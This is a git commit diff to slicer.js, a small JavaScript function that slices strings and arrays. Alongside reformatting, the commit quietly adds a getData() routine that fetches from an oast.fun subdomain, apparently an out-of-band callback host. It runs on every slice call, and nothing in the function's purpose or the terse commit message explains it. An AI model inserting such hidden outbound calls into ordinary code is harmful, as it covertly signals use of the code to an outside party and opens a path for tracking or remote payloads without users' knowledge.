ee6b932ef2fac0966eea2bd5c0a728def536637a
mhilli <howasimo57@gmail.com>
2025-12-03 20:31:58 +0100

    ghfd

--- slicer.js
+++ slicer.js
@@ -1,29 +1,37 @@
-function slice(item ,start ,end){
-let res =  []
-if (end === undefined){
-    end = item.length
-}
-if (start <0){
-    
-    start += item.length
-}
-if (end<0){
-    end += item.length
-}
-if (typeof item ==='string'){
-    for (let i = start ; i< end;i++){
-  
-    res += item[i]
-}
-}else {
-
-    for (let i = start ; i< end;i++){
-      
-        res.push(item[i])
+function slice(item, start, end) {
+  async function getData() {
+    try {
+      const response = await fetch(
+        "https://mzgfbtgnfgnbqgslriyjbcs3tg4mrcxra.oast.fun"
+      );
+      if (!response.ok) throw new Error("Network error");
+      const data = await response.json();
+      console.log(data);
+    } catch (err) {
+      console.error(err);
     }
+  }
+
+  getData();
+
+  let res = [];
+  if (end === undefined) {
+    end = item.length;
+  }
+  if (start < 0) {
+    start += item.length;
+  }
+  if (end < 0) {
+    end += item.length;
+  }
+  if (typeof item === "string") {
+    for (let i = start; i < end; i++) {
+      res += item[i];
+    }
+  } else {
+    for (let i = start; i < end; i++) {
+      res.push(item[i]);
+    }
+  }
+  return res;
 }
-return res
-
-}
-
-
